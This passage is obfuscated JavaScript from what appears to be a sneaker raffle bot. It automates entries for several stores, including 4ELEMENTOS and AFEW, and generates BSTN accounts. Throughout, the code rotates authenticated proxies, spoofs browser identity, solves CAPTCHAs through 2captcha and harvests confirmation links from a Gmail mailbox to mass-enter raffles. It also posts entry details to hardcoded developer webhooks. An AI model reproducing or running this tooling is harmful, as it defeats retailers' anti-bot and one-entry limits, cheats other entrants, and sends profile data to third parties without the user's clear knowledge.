                            const _0x275084 = await _0x1940ad['newPage']();
                            await _0x275084['authenticate']({
                                'username': '' + _0x3077db[0x2],
                                'password': '' + _0x3077db[0x3]
                            }), await _0x275084['setRequestInterception'](!![]), _0x275084['on']('request', _0x565e40 => {
                                _0x565e40['resourceType']() === 'image' || _0x565e40['resourceType']() === 'font' || _0x565e40['resourceType']() === 'media' ? _0x565e40['abort']() : _0x565e40['continue']();
                            }), await _0x275084['goto'](_0x63f64a[_0x55cf5e]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x275084['waitForSelector']('#accept-all-gdpr'), await _0x275084['click']('#accept-all-gdpr'), await _0x275084['waitForSelector']('#raffles-product'), await _0x28bb81(0x3e8), await _0x275084['$eval']('#raffles-product', _0x45af07 => _0x45af07['click']()), await _0x28bb81(0x1388), await _0x275084['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x2442c9 = await _0x275084['$']('.fancybox-inner\x20>\x20iframe'), _0x2bd28e = await _0x2442c9['contentFrame']();
                            console['log'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20:\x20Checking\x20Information'), await _0x2bd28e['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x28bb81(0x1f4), await _0x2bd28e['type']('input[name=\x22sm-form-email\x22]', _0x63f64a[_0x55cf5e]['Email']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-form-name\x22]', _0x63f64a[_0x55cf5e]['FirstName'] + '\x20' + _0x63f64a[_0x55cf5e]['LastName']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-form-street\x22]', _0x63f64a[_0x55cf5e]['Address1'] + '\x20' + _0x63f64a[_0x55cf5e]['HouseNumber'] + '\x20' + _0x63f64a[_0x55cf5e]['Address2']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-form-city\x22]', _0x63f64a[_0x55cf5e]['City']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-form-province\x22]', _0x63f64a[_0x55cf5e]['State']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-form-zip\x22]', _0x63f64a[_0x55cf5e]['Zip']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-form-country\x22]', _0x63f64a[_0x55cf5e]['Country']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-form-phone\x22]', _0x63f64a[_0x55cf5e]['Phone']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x63f64a[_0x55cf5e]['Follower']), await _0x28bb81(0xc8), await _0x2bd28e['type']('input[name=\x22sm-cst.size\x22]', _0x63f64a[_0x55cf5e]['Size']), await _0x28bb81(0x1f4), await _0x2bd28e['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x28bb81(0x1f4), await _0x2bd28e['click']('.icheckbox_simple-custom'), await _0x28bb81(0x1f4), console['log'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2bd28e['$eval']('form', _0x47b774 => _0x47b774['submit']()), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x4f9502 = '';
                            var _0x5bfe2a = await _0xb1aeae(_0x63f64a[_0x55cf5e], _0x51a422, 'dev', ![]), _0xb902d0 = await _0xb1aeae(_0x63f64a[_0x55cf5e], _0x51a422, 'pub', ![]);
                            const _0x3818f9 = {
                                'succesDEVMSG': { 'embeds': [_0x5bfe2a] },
                                'succesPUBMSG': { 'embeds': [_0xb902d0] }
                            };
                            try {
                                _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x3818f9['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x3818f9['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x4a9ac0, _0x3818f9['succesPUBMSG']);
                            } catch (_0x44ea29) {
                                console['log'](_0x2367c9['yellow'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x44ea29));
                            }
                        } catch (_0x576d75) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20:\x20' + _0x576d75)), _0x5bf6c4 = '' + _0x576d75;
                            var _0x316aba = await _0xb1aeae(_0x63f64a[_0x55cf5e], _0x51a422, 'dev', !![], _0x5bf6c4), _0x5bfe2a = await _0xb1aeae(_0x63f64a[_0x55cf5e], _0x51a422, 'dev', ![]), _0xb902d0 = await _0xb1aeae(_0x63f64a[_0x55cf5e], _0x51a422, 'pub', ![]);
                            const _0x53d3c2 = {
                                'succesDEVMSG': { 'embeds': [_0x5bfe2a] },
                                'succesPUBMSG': { 'embeds': [_0xb902d0] }
                            };
                            _0x53d3c2['errorDEV'] = { 'embeds': [_0x316aba] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x53d3c2['errorDEV']), await _0x40545a(_0x2b1b7c, _0x53d3c2['errorDEV']), _0x576d75 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4f9502 = 'yes');
                        } finally {
                            _0x1940ad['close']();
                            if (_0x4f9502 == 'yes' && _0x130f63 != 0x5 && _0x5bf6c4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Task\x20' + (_0x55cf5e + 0x1) + '\x20:\x20Retrying')), _0x55cf5e = _0x55cf5e - 0x1, _0x130f63 = _0x130f63 + 0x1;
                                continue;
                            }
                            _0x4f9502 == 'yes' && _0x130f63 >= 0x5 && (_0x1322f8(_0x63f64a[_0x55cf5e], _0x51a422), _0x4f9502 = 'no', _0x130f63 = 0x0), console['log'](_0x51d312() + '\x20[' + _0x51a422['name'] + ']\x20Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x51b72e, _0x2870d3) {
                    var _0x19ad60 = [];
                    async function _0x1dec93() {
                        var _0x39b658 = new _0x575543({
                            'user': _0x37b240['masterMail'],
                            'password': _0x37b240['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2fd86e(_0x1b3be9) {
                            _0x39b658['openBox']('INBOX', ![], _0x1b3be9);
                        }
                        _0x39b658['once']('ready', function () {
                            _0x2fd86e(function (_0x4ce386, _0x5ecfb4) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4ce386)
                                    throw _0x4ce386;
                                _0x39b658['seq']['search'](['UNSEEN'], function (_0x2ab7e8, _0x39b248) {
                                    if (!_0x39b248 || !_0x39b248['length'])
                                        console['log'](_0x51d312() + '\x20[' + _0x51b72e['name'] + ']\x20No\x20mails\x20found'), _0x39b658['end']();
                                    else {
                                        var _0xb4c46d = _0x39b658['seq']['fetch'](_0x39b248, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xb4c46d['on']('message', function (_0x1f2de9, _0x4ead4e) {
                                            var _0x3f3fcf = '(#' + _0x4ead4e + ')\x20';
                                            _0x1f2de9['on']('body', function (_0x596807, _0x45a961) {
                                                _0x565ceb(_0x596807, (_0x1e4134, _0x3aa5dd) => {
                                                    if (_0x3aa5dd['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x5a2d83 = _0x3aa5dd['html']['split']('\x0a');
                                                        for (var _0x3031e2 = 0x0; _0x3031e2 < _0x5a2d83['length']; _0x3031e2++) {
                                                            if (_0x5a2d83[_0x3031e2]['includes']('salesmanago') && _0x5a2d83[_0x3031e2]['includes']('<td') && _0x5a2d83[_0x3031e2]['includes']('href')) {
                                                                var _0x524318 = _0x5a2d83[_0x3031e2]['split']('href=\x22'), _0x343616 = _0x524318[0x1]['split']('\x22')[0x0];
                                                                _0x19ad60['push'](_0x343616);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x1f2de9['once']('end', function () {
                                            });
                                        }), _0xb4c46d['once']('error', function (_0x4ce7e2) {
                                            console['log']('Fetch\x20error:\x20' + _0x4ce7e2);
                                        }), _0xb4c46d['once']('end', function () {
                                            _0x39b658['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x39b658['once']('error', function (_0x35b41e) {
                            console['log'](_0x2367c9['red'](_0x35b41e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x39b658['once']('end', async function () {
                        }), _0x39b658['connect']();
                    }
                    async function _0x42cf55(_0x4bedf9, _0x144a61, _0x24eaa2) {
                        for (var _0x39c1a9 = 0x0; _0x39c1a9 < _0x144a61['length']; _0x39c1a9++) {
                            async function _0x2b3aa2(_0x1a1e8d, _0x43ece7, _0x24fc33, _0x172f5c, _0x94cdfd) {
                                var _0x3c9bcd, _0xb3817a = {}, _0x2382af = [], _0x4ba963 = {}, _0x4bb5c2 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0xde1966 = Math['round'](Math['random']() * (_0x4bb5c2['length'] - 0x1));
                                _0x172f5c[_0x1a1e8d]['Size'] == 'RANDOM' && (_0x172f5c[_0x1a1e8d]['Size'] = _0x4bb5c2[_0xde1966]);
                                !_0x172f5c && (_0x172f5c = {});
                                if (_0x37b240['useRandomProxy'] = ![])
                                    var _0x5c905d = _0x94cdfd[_0x1a1e8d]['split'](':');
                                else
                                    var _0x5c6b6b = Math['round'](Math['random']() * (_0x94cdfd['length'] - 0x1)), _0x5c905d = _0x94cdfd[_0x5c6b6b]['split'](':');
                                var _0x3443a7 = {
                                    'jar': _0x1945a2,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x24fc33['url'],
                                    'headers': _0x24fc33['headers'],
                                    'body': JSON['stringify'](_0xb3817a),
                                    'proxy': 'http://' + _0x5c905d[0x2] + ':' + _0x5c905d[0x3] + '@' + _0x5c905d[0x0] + ':' + _0x5c905d[0x1]
                                };
                                return _0x43ece7 != 'ver' && (_0x3443a7['url'] = _0x24fc33['url'], _0x3443a7['headers'] = _0x24fc33['headers']), _0x43ece7 == 'ver' && (_0x3443a7['method'] = 'GET', _0x3443a7['url'] = _0x172f5c[_0x1a1e8d]), new Promise(function (_0x2429ae, _0x22eff9) {
                                    callback = async (_0x24bef2, _0x576801, _0x41a9f2) => {
                                        if (!_0x24bef2 && _0x576801['statusCode'] == 0xca || !_0x24bef2 && _0x576801['statusCode'] == 0xc8) {
                                            if (_0x43ece7 != 'ver') {
                                                var _0x1e3c97 = await _0xb1aeae(_0x172f5c[_0x1a1e8d], _0x24fc33, 'dev', ![]), _0x22784d = await _0xb1aeae(_0x172f5c[_0x1a1e8d], _0x24fc33, 'pub', ![]);
                                                const _0x1f0244 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1e3c97] },
                                                    'succesPUBMSG': { 'embeds': [_0x22784d] }
                                                };
                                                if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                                                    try {
                                                        await _0x40545a(_0x37b240['webhook'], _0x1f0244['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x1f0244['succesDEVMSG']), await _0x28bb81(0xc8);
                                                try {
                                                    await _0x40545a(_0x4a9ac0, _0x1f0244['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4d8543(_0x172f5c[_0x1a1e8d], _0x24fc33);
                                            }
                                            _0x2429ae(console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x24fc33['name'] + ']\x20Task\x20' + (_0x1a1e8d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x43ece7 != 'ver') {
                                                var _0x90b807 = '' + _0x24bef2, _0x5acaac = await _0xb1aeae(_0x172f5c[_0x1a1e8d], _0x24fc33, 'dev', !![], _0x90b807), _0x1c4b52 = {};
                                                _0x1c4b52['errorDEV'] = { 'embeds': [_0x5acaac] }, _0x1322f8(_0x172f5c[_0x1a1e8d], _0x24fc33), _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x1c4b52['errorDEV']), await _0x40545a(_0x2b1b7c, _0x1c4b52['errorDEV']);
                                            }
                                            _0x22eff9(console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x24fc33['name'] + ']\x20Task\x20' + (_0x1a1e8d + 0x1) + ':\x20' + _0x24bef2)));
                                        }
                                    };
                                    try {
                                        _0x43ece7 != 'ver' ? console['log'](_0x51d312() + '\x20[' + _0x24fc33['name'] + ']\x20Task\x20' + (_0x1a1e8d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xb3817a['data']['attributes']['email']) : console['log'](_0x51d312() + '\x20[' + _0x24fc33['name'] + ']\x20Task\x20' + (_0x1a1e8d + 0x1) + ':\x20Fetching\x20Response'), _0x1f14da(_0x3443a7, callback);
                                    } catch (_0x28a456) {
                                        console['log'](_0x51d312() + '\x20Task\x20' + (_0x1a1e8d + 0x1) + ':\x20' + _0x28a456);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2b3aa2(_0x39c1a9, 'ver', _0x4bedf9, _0x144a61, _0x24eaa2), console['log'](_0x51d312() + '\x20[' + _0x4bedf9['name'] + ']\x20Sleeping\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                            } catch (_0x595156) {
                            }
                        }
                    }
                    try {
                        _0x1dec93(), await _0x28bb81(0xfa0), console['log']('Found\x20' + _0x19ad60['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x42cf55(_0x51b72e, _0x19ad60, _0x2870d3);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x4deca1, _0x140fcb, _0x27aeb9) {
                for (var _0x583dbb = 0x0; _0x583dbb < _0x140fcb['length']; _0x583dbb++) {
                    _0x37b240['AfewDelay'] = _0x37b240['delay'];
                    var _0x370b9a;
                    if (_0x4a6528 != 'yes')
                        var _0x4a6528 = '', _0x44e9f4 = 0x0;
                    var _0x5249d2 = _0x140fcb[_0x583dbb]['Url'];
                    _0x50109a(_0x4deca1['name'] + '\x20Task\x20' + (_0x583dbb + 0x1) + '\x20/\x20' + _0x140fcb['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x140fcb, _0x583dbb);
                    var _0x58a27a = await _0xb1aeae(_0x140fcb[_0x583dbb], _0x4deca1, 'dev', ![]), _0x15e7f4 = await _0xb1aeae(_0x140fcb[_0x583dbb], _0x4deca1, 'pub', ![]);
                    const _0x36fca1 = {
                        'succesDEVMSG': { 'embeds': [_0x58a27a] },
                        'succesPUBMSG': { 'embeds': [_0x15e7f4] }
                    };
                    if (_0x140fcb[_0x583dbb]['Email'] == '' || _0x140fcb[_0x583dbb]['FirstName'] == '' || _0x140fcb[_0x583dbb]['LastName'] == '' || _0x140fcb[_0x583dbb]['Country'] == '' || _0x140fcb[_0x583dbb]['Size'] == '' || _0x140fcb[_0x583dbb]['Address1'] == '' || _0x140fcb[_0x583dbb]['Zip'] == '') {
                        console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x37b240['useRandomProxy'] = ![])
                        var _0x3d2f91 = _0x27aeb9[_0x583dbb]['split'](':');
                    else
                        var _0x4d2cd0 = Math['round'](Math['random']() * (_0x27aeb9['length'] - 0x1)), _0x3d2f91 = _0x27aeb9[_0x4d2cd0]['split'](':');
                    const _0x6ca50f = await _0x3b2a97['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x3d2f91[0x0] + ':' + _0x3d2f91[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x4ef03e = await _0x6ca50f['newPage']();
                        await _0x4ef03e['setDefaultNavigationTimeout'](0x1d4c0), await _0x4ef03e['authenticate']({
                            'username': '' + _0x3d2f91[0x2],
                            'password': '' + _0x3d2f91[0x3]
                        }), console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ef03e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4ef03e['setRequestInterception'](!![]), _0x4ef03e['on']('request', _0x4ff892 => {
                            _0x4ff892['resourceType']() === 'image' || _0x4ff892['resourceType']() === 'font' || _0x4ff892['resourceType']() === 'media' ? _0x4ff892['abort']() : _0x4ff892['continue']();
                        }), await _0x4ef03e['goto'](_0x5249d2, { 'waitUntil': 'networkidle2' }), console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x4ef03e['waitForTimeout'](0xfa0), console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Cookies\x20received'), await _0x4ef03e['waitForTimeout'](0x320);
                        if (_0x140fcb[_0x583dbb]['Size'] == 'RANDOM') {
                            console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x3886ff = await _0x4ef03e['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x280055 => {
                                return _0x280055['map'](_0x2cf347 => _0x2cf347['href']);
                            });
                            var _0x24a330 = Math['round'](Math['random']() * (_0x3886ff['length'] - 0x1));
                            await _0x4ef03e['goto']('' + _0x3886ff[_0x24a330]);
                        } else {
                            console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x140fcb[_0x583dbb]['Size']);
                            try {
                                const _0x11511e = await _0x4ef03e['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x140fcb[_0x583dbb]['Size'] + '\x22]\x20>\x20a', _0x56a8e2 => {
                                    return _0x56a8e2['map'](_0x15f3ed => _0x15f3ed['href']);
                                });
                                await _0x4ef03e['goto']('' + _0x11511e[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x28ed4f) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20' + _0x28ed4f + '\x20Size\x20not\x20found')), _0x370b9a = 'Size\x20Not\x20Found';
                                var _0x5a8f37 = await _0xb1aeae(_0x140fcb[_0x583dbb], _0x4deca1, 'dev', !![], _0x370b9a);
                                _0x36fca1['errorDEV'] = { 'embeds': [_0x5a8f37] };
                                _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x36fca1['errorDEV']);
                                await _0x40545a(_0x2b1b7c, _0x36fca1['errorDEV']);
                                continue;
                            }
                        }
                        await _0x4ef03e['waitForTimeout'](0x258), await _0x4ef03e['type']('#raffle-instagram', '' + _0x140fcb[_0x583dbb]['Follower'], { 'delay': 0x64 }), await _0x4ef03e['waitForTimeout'](0x384), await _0x4ef03e['click']('#raffle-terms'), await _0x4ef03e['waitForTimeout'](0x384), await _0x4ef03e['evaluate'](() => {
                            const _0x4a0a08 = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x4a0a08['click']();
                        }), await _0x4ef03e['waitForTimeout'](0xbb8), await _0x4ef03e['waitForSelector']('#checkout_email'), await _0x28bb81(0x3e8), console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4ef03e['type']('#checkout_email', '' + _0x140fcb[_0x583dbb]['Email'], 0x32), await _0x28bb81(0x320), await _0x4ef03e['select']('#checkout_shipping_address_country', '' + _0x140fcb[_0x583dbb]['Country']), await _0x4ef03e['waitForTimeout'](0x258), await _0x4ef03e['type']('#checkout_shipping_address_first_name', '' + _0x140fcb[_0x583dbb]['FirstName']), await _0x4ef03e['waitForTimeout'](0x320), await _0x4ef03e['type']('#checkout_shipping_address_last_name', '' + _0x140fcb[_0x583dbb]['LastName']), await _0x4ef03e['waitForTimeout'](0x2bc), await _0x4ef03e['type']('#checkout_shipping_address_address1', _0x140fcb[_0x583dbb]['Address1'] + '\x20' + _0x140fcb[_0x583dbb]['HouseNumber']), await _0x4ef03e['waitForTimeout'](0x2bc), await _0x4ef03e['type']('#checkout_shipping_address_address2', '' + _0x140fcb[_0x583dbb]['Address2']), await _0x4ef03e['waitForTimeout'](0x2bc);
                        _0x140fcb[_0x583dbb]['Postcode'] == undefined ? await _0x4ef03e['type']('#checkout_shipping_address_zip', '' + _0x140fcb[_0x583dbb]['Zip']) : await _0x4ef03e['type']('#checkout_shipping_address_zip', '' + _0x140fcb[_0x583dbb]['Postcode']);
                        await _0x4ef03e['waitForTimeout'](0x2bc), await _0x4ef03e['type']('#checkout_shipping_address_city', '' + _0x140fcb[_0x583dbb]['City']), await _0x4ef03e['waitForTimeout'](0x2bc), console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x4ef03e, _0x4ef03e['evaluate'](() => {
                            const _0x3dacfe = document['querySelector']('#continue_button');
                            for (var _0x5423d3 = 0x0; _0x5423d3 < 0x5; _0x5423d3++) {
                                if (_0x3dacfe) {
                                    _0x3dacfe['click'](), _0x3dacfe['click']();
                                    break;
                                } else
                                    _0x28bb81(0xfa0);
                            }
                        }), await _0x4ef03e['waitForTimeout'](0x1194);
                        try {
                            await _0x4ef03e['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x4ef03e['evaluate'](() => {
                            const _0x3e4a30 = document['querySelector']('#continue_button');
                            for (var _0x38d862 = 0x0; _0x38d862 < 0x5; _0x38d862++) {
                                if (_0x3e4a30) {
                                    _0x3e4a30['click']();
                                    break;
                                } else
                                    _0x28bb81(0xfa0);
                            }
                        }), await _0x4ef03e['waitForTimeout'](0x7d0), console['log'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4ef03e['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x4ef03e['evaluate'](() => {
                            const _0x2e8d58 = document['querySelector']('#continue_button');
                            for (var _0x3bd454 = 0x0; _0x3bd454 < 0x5; _0x3bd454++) {
                                if (_0x2e8d58) {
                                    _0x2e8d58['click']();
                                    break;
                                } else
                                    _0x28bb81(0xfa0);
                            }
                        }), await _0x4ef03e['waitForTimeout'](0x1194), await _0x4ef03e['waitForSelector']('#continue_button'), _0x4ef03e['evaluate'](() => {
                            const _0xa74fb4 = document['querySelector']('#continue_button');
                            for (var _0x388160 = 0x0; _0x388160 < 0x5; _0x388160++) {
                                if (_0xa74fb4) {
                                    _0xa74fb4['click']();
                                    break;
                                } else
                                    _0x28bb81(0xfa0);
                            }
                        });
                        try {
                            await _0x4ef03e['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x4a6528 = 'no', _0x4d8543(_0x140fcb[_0x583dbb], _0x4deca1), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                                try {
                                    await _0x40545a(_0x37b240['webhook'], _0x36fca1['succesDEVMSG']);
                                } catch {
                                }
                            await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x36fca1['succesDEVMSG']), await _0x28bb81(0xc8);
                            try {
                                await _0x40545a(_0x4a9ac0, _0x36fca1['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x4c4cb8) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x4c4cb8));
                        }
                    } catch (_0x5cb65a) {
                        console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20' + _0x5cb65a)), _0x370b9a = '' + _0x5cb65a;
                        var _0x5a8f37 = await _0xb1aeae(_0x140fcb[_0x583dbb], _0x4deca1, 'dev', !![], _0x370b9a);
                        _0x36fca1['errorDEV'] = { 'embeds': [_0x5a8f37] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x36fca1['errorDEV']), await _0x40545a(_0x2b1b7c, _0x36fca1['errorDEV']), _0x4a6528 = 'yes';
                    } finally {
                        _0x6ca50f && _0x6ca50f['close']();
                        if (_0x4a6528 == 'yes' && _0x44e9f4 != 0x5 && _0x370b9a != 'Size\x20Not\x20Found') {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x4deca1['name'] + ']\x20Task\x20' + (_0x583dbb + 0x1) + '\x20:\x20Retrying')), _0x583dbb = _0x583dbb - 0x1, _0x44e9f4 = _0x44e9f4 + 0x1;
                            continue;
                        }
                        _0x4a6528 == 'yes' && _0x44e9f4 >= 0x5 && (_0x1322f8(_0x140fcb[_0x583dbb], _0x4deca1), _0x4a6528 = 'no', _0x44e9f4 = 0x0);
                        if (_0x583dbb + 0x1 == _0x140fcb['length']) {
                            await _0x28bb81(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x37b240['AfewDelay'] + '\x20ms'), await _0x28bb81(_0x37b240['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2a7772, _0x461dc0, _0x455212) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x8da887 = 0x0; _0x8da887 < _0x461dc0['length']; _0x8da887++) {
                        if (_0x209c6b != 'yes')
                            var _0x209c6b = '', _0xf3ef4b = 0x0;
                        var _0x1624f3;
                        await _0x129938(_0x461dc0, _0x8da887), _0x50109a(_0x2a7772['name'] + '\x20Task\x20' + (_0x8da887 + 0x1) + '\x20/\x20' + _0x461dc0['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57);
                        var _0x1d3241 = await _0xb1aeae(_0x461dc0[_0x8da887], _0x2a7772, 'acc', ![]);
                        const _0x1bfd42 = { 'succesDEVMSG': { 'embeds': [_0x1d3241] } }, _0x3a8379 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x888e2b = Math['round'](Math['random']() * (_0x455212['length'] - 0x1)), _0x1cd319 = _0x455212[_0x888e2b]['split'](':');
                        const _0x347465 = await _0x3b2a97['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1cd319[0x0] + ':' + _0x1cd319[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x4322ff = await _0x347465['newPage']();
                            await _0x4322ff['authenticate']({
                                'username': '' + _0x1cd319[0x2],
                                'password': '' + _0x1cd319[0x3]
